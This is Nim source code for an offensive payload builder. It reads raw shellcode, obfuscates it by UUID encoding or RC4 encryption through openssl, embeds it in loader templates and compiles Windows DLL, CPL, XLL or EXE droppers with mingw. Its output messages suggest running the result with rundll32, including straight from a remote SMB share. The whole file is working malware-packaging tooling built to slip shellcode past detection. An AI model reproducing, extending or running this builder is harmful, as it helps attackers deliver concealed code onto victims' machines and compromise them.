import std/strutils
import std/[sugar, algorithm]
import std/sequtils
import std/strformat
import std/os
import std/osproc
import nimcrypto
import std/random
import includes/rc4
import std/terminal
import argparse

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

iterator chunked*[T](s: openArray[T], size: Positive): seq[T] =
# Stolen from https://github.com/narimiran/itertools/blob/master/src/itertools.nim
  ## Iterator which yields ``size``-sized chunks from ``s``.
  var i: int
  while i + size < len(s):
    yield s[i ..< i+size]
    i += size
  yield s[i .. ^1]

var 
    shellcodeFilePath: string
    extension: string
    architecture: string
    verbosity: bool
    obfuscate: string
    file: string
    templatePath: string 
    shellcode: string
    scArray: seq[byte]
    aesPasswd: string
    shaKey: MDigest[256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    encSC: seq[byte]
    testVar: string = " @[byte "
    compileCmd: string
    debug: bool
    
var p = newParser:
    flag("-v", "--verbose", help="Show all output")
    flag("-d", "--debug", help="Enable visible command prompt")
    option("-o", "--obfuscate", help="Specify which obfuscation method to use", choices= @["aes", "rc4", "uuid"], default=some("uuid"))
    option("-s", "--shellcode", help="Specify path to raw shellcode file", required=true)
    option("-a", "--arch", help="Specify architecture of output file. Only applies to XLL payloads!", choices= @["x64", "x86"], default=some("x64"))
    option("-e", "--extension", help="Specify output file type.", choices= @["cpl", "xll", "dll", "exe"], default=some("dll"))

try:
    var opts = p.parse()
    shellcodeFilePath = opts.shellcode
    architecture = opts.arch
    verbosity = opts.verbose
    obfuscate = opts.obfuscate
    extension = opts.extension
    debug = opts.debug

except ShortCircuit as err:
    if err.flag == "argparse_help":
        echo err.help
        quit(1)
except UsageError:
    stderr.writeLine getCurrentExceptionMsg()
    quit(1)

if obfuscate == "aes":
    templatePath = joinPath(getCurrentDir(), "templates/aes/")
elif obfuscate == "rc4":
    templatePath = joinPath(getCurrentDir(), "templates/rc4/")
else:
    templatePath = joinPath(getCurrentDir(), "templates/uuid/")

templatePath = joinPath(templatePath, fmt"simple{extension}.nim")
var tempFile = "temp_simple$1.nim" % [extension]

proc buildCompileCmdStr(): void =
    # Base Compile Command
    compileCmd = fmt "{joinPath(getHomeDir(), \".nimble/bin/nim\")} c -d:mingw --opt:none -d:strip -d:release -d:danger -o=simple{obfuscate}.{extension}"

    # Set file type specific options
    if extension != "exe": compileCmd.add(" --nomain --app=lib")
    else:
        if debug: compileCmd.add(" --app=console")
        else: compileCmd.add(" --app=gui")

    # Set encoding/encryption specific options
    if obfuscate != "uuid": compileCmd.add(" -l:resource.o")

    if architecture == "x64": compileCmd.add(" --cpu=amd64")
    else: compileCmd.add(" --cpu=i386")
    
    # Set file to compile
    compileCmd.add(" " & tempFile)

proc aesEncrypt(): void = 
    
    ## Nim's way API using openArray[byte].

    var ectx: CTR[aes256]

    scArray = shellcode.toByteSeq

    encSC = newSeq[byte](len(scArray))

    randomize()
    const asciiRange = 32..126
    aesPasswd = 32.newSeqWith(asciiRange.rand.char).join
    var expandedKey = sha256.digest(aesPasswd)
    #shaKey = expandedKey
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    discard randomBytes(addr iv[0], 16)

    # Initialization of CBC[aes256] context with encryption key
    ectx.init(key, iv)
    # Encryption process
    ectx.encrypt(scArray, encSC)
    # Clear context of CBC[aes256]
    ectx.clear()

proc rc4Encrypt(): void =
    # RC4 Encrypt shellcode to file
    echo "[Status] Generating RC4 Key!"
    var genXXDKey = execCmdEx("echo -n 'testKeytestKeyte' | /usr/bin/xxd -p")
    var xxdKey: string
    if genXXDKey.exitCode == 0:
        xxdKey = genXXDKey.output
        xxdKey.stripLineEnd
        echo "[Status] RC4 key hexadecimal is: $1" % [xxdKey]
    else:
        stdout.styledWriteLine(fgRed, "[Failure] Key generation failed!")
        stdout.styledWriteLine(fgCyan, "[Tip] Ensure xxd is installed and in /usr/bin!")
    var opensslCmd: string = "/usr/bin/openssl enc -rc4 -in $1 -K $2 -nosalt -out encContent.bin" % [shellcodeFilePath, xxdKey]
    echo "[Status] Running the following command: $1" % [opensslCmd]
    try:
        var opensslResult = execCmdEx(opensslCmd)
        if opensslResult.exitCode == 0:
            stdout.styledWriteLine(fgGreen, "[Success] RC4 Encrypted shellcode file created!")
        else:
            stdout.styledWriteLine(fgRed, "[Failure] OpenSSL failed!")
            stdout.styledWriteLine(fgRed, opensslResult.output)
            echo "[Status] Trying again with added option: -provider legacy"
            # Add option to OpenSSL
            opensslCmd.add(" -provider legacy")
            opensslResult = execCmdEx(opensslCmd)
            if opensslResult.exitCode == 0:
                stdout.styledWriteLine(fgGreen, "[Success] RC4 Encrypted shellcode file created!")
            else:
                stdout.styledWriteLine(fgRed, "[Failure] OpenSSL failed!")
                stdout.styledWriteLine(fgRed, opensslResult.output)
                stdout.styledWriteLine(fgCyan, "[Tip] Ensure OpenSSL is installed and in /usr/bin!")
                quit(1)
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not create RC4 encrypted shellcode file!")
        quit(1)
    except:
        stdout.styledWriteLine(fgRed, "[Failure] File could not be created!")
        quit(1)

    # Create resource file
    try:
        writeFile("resource.rc", "100 RCDATA \"encContent.bin\"")
        stdout.styledWriteLine(fgGreen, "[Success] Resource file created!")
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not create resource file!")
        quit(1)

    # Compile resource file
    let rcCompileResults = execCmdEx("/usr/bin/x86_64-w64-mingw32-windres resource.rc -o resource.o")
    if rcCompileResults.exitCode == 0:
        stdout.styledWriteLine(fgGreen, "[Success] Resource file compiled into object file!")
        removeFile("resource.rc")
    else:
        stdout.styledWriteLine(fgRed, "[Failure] Could not compile resource file!")
        stdout.styledWriteLine(fgCyan, "[Tip] Ensure x86_64-w64-mingw32-windres is in /usr/bin!")
        stdout.styledWriteLine(fgRed, rcCompileResults.output)
        quit(1)

proc uuidEncode(sc: string): (int, seq[string]) =
    # Stolen from https://www.stevencampbell.info/Nim-Convert-Shellcode-to-UUID/
    let scHex = sc.toHex
    ## This proc takes a string and outputs a sequence of UUID's
    var sc_seq = collect(for x in scHex.chunked(2): x.join(""))
    # check if shellcode len evenly divisible by 16 and pad with nops as required
    if len(sc_seq) mod 16 != 0:
        var padding: int = 16 - (len(sc_seq) mod 16)
        for x in 0..<padding:
            sc_seq = "90" & sc_seq
    # break up sc_seq into 16 byte chunks
    let chunks = len(sc_seq) div 16
    var seqOfSeqs = sc_seq.distribute(chunks)
    # construct UUID's
    var uuids: seq[string]
    for sequence in seqOfSeqs:
        var first: seq[string] = sequence[0..3].reversed
        var second: seq[string] = sequence[4..5].reversed
        var third: seq[string] = sequence[6..7].reversed
        var fourth: seq[string] = sequence[8..9]
        var fifth: seq[string] = sequence[10..15]
        var uuid: string = first.join() & '-' & second.join() & '-' & third.join() & '-' & fourth.join() & '-' & fifth.join()
        uuids.add(uuid)
    return (len(uuids), uuids)

proc generatePayload(): void =
    var 
        templateFile: string
        #tempFile: string
    buildCompileCmdStr()
    # Read raw shellcode file
    try:
        echo """
 ___            _              
| __| _ _  ___ | |__  _  _  ___
| _| | '_|/ -_)|  _ \| || |(_-/
|___||_|  \___||____/ \_._|/__/
        """
        echo "[Status] Parsing shellcode in $1" % [shellcodeFilePath]
        shellcode = readFile(shellcodeFilePath)
        if shellcode == "" or shellcode.len == 0:
            stdout.styledWriteLine(fgRed, "[Failure] Shellcode file is empty!")
            quit(1)
        #echo "shellcode = ", toHex(shellcode)
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not open shellcode file!")
        quit(1)
    echo "[Status] Generating Payload! Be patient."
    try:
        templateFile = templatePath.readFile()
    except IOError:
        stdout.styledWriteLine(fgRed, "[Failure] Could not locate template file at $1" % [templatePath])

    if obfuscate == "uuid":
        # Generate UUID payload
        var uuids: seq[string]
        var uuidCount: int
        var uuidPlaceholder: string = "REPLACE_ME_UUID"
        var uuidSizePlaceholder: string = "REPLACE_ME_SIZE"
        echo "[Status] Encoding shellcode into UUIDs and adding to template!"
        (uuidCount, uuids) = uuidEncode(shellcode)
        try:
            templateFile = templateFile.replace(uuidPlaceholder, $uuids)
            templateFile = templateFile.replace(uuidSizePlaceholder, $uuidCount)
            tempFile.writeFile(templateFile)
        except:
            stdout.styledWriteLine(fgRed, "[Failure] Cannot add encoded shellcode to template file!")
            quit(1)
    elif obfuscate == "aes":
        stdout.styledWriteLine(fgRed, "[Failure] AES Encryption feature currently not enabled!")
        quit(1)
        #[aesEncrypt()
        # Write encrypted shellcode to template as string
        let placeholder = "REPLACE_ME"
        for x in encSC.items:
            testVar.add("0x" & (toHex(x)) & ", ")
        testVar.removeSuffix(", ")
        testVar.add("]")
        
        let replacement = testVar
        try:
            echo "[Status] Encrypting shellcode using AES-256 CTR!"
            templateFile = templateFile.replace(placeholder, replacement)
            tempFile.writeFile(templateFile)
        except:
            stdout.styledWriteLine(fgRed, "[Failure] Cannot add encrypted shellcode to template file!")
            quit(1)
        let origPass = "BLANK_PASSWORD"
        try:
            echo "[Status] Adding AES key to template file!"
            templateFile = templateFile.replace(origPass, aesPasswd)
            tempFile.writeFile(templateFile)
        except:
            stdout.styledWriteLine(fgRed, "[Failure] Cannot add AES key to template file!")
            quit(1)
        let origIV = "BLANK_IV"
        try:
            echo "[Status] Adding AES IV to template file!"
            templateFile = templateFile.replace(origIV, toHex(iv))
            tempFile.writeFile(templateFile)
        except:
            stdout.styledWriteLine(fgRed, "[Failure] Cannot add AES IV to template file!")
            quit(1)
        ]#
    else:
        rc4Encrypt()
        try:
            tempFile.writeFile(templateFile)
            stdout.styledWriteLine(fgGreen, "[Success] Copy from template file succeeded!")
        except IOError:
            stdout.styledWriteLine(fgRed, "[Failure] Copy from template file failed!")
    
    echo "[Status] Waiting on compiler..."
    let compileResults = execCmdEx(compileCmd)
    if compileResults.exitCode != 0:
        stdout.styledWriteLine(fgRed, "[Failure] Cannot compile payload!")
        stdout.styledWriteLine(fgRed, compileResults.output)
        quit(1)
    elif compileResults.exitCode == 0 and verbosity:
        echo compileResults.output
        stdout.styledWriteLine(fgGreen, "[Success] Payload compiled successfully!")
    else:
        stdout.styledWriteLine(fgGreen, "[Success] Payload compiled successfully!")
        if "cpl" in compileCmd: stdout.styledWriteLine(fgCyan, "[Tip] Treat .cpl files the same as .exe!")
        elif "dll" in compileCmd: 
            stdout.styledWriteLine(fgCyan, fmt"[Tip] Try running with 'rundll32 simple{obfuscate}.{extension},start'")
            stdout.styledWriteLine(fgCyan, fmt"[Pro Gamer Move] Run in memory by hosting on SMB Server and running with 'rundll32 \\<IP>\<SHARE>\simple{obfuscate}.{extension},start'")
    
    echo "[Status] Cleaning up..."
    tempFile.removeFile()
    if fileExists("resource.o"):
        removeFile("resource.o")
    if fileExists("encContent.bin"):
        removeFile("encContent.bin")
    echo fmt "[Status] Done! simple{obfuscate}.{extension} created!"
    quit(0)

when isMainModule:
    generatePayload()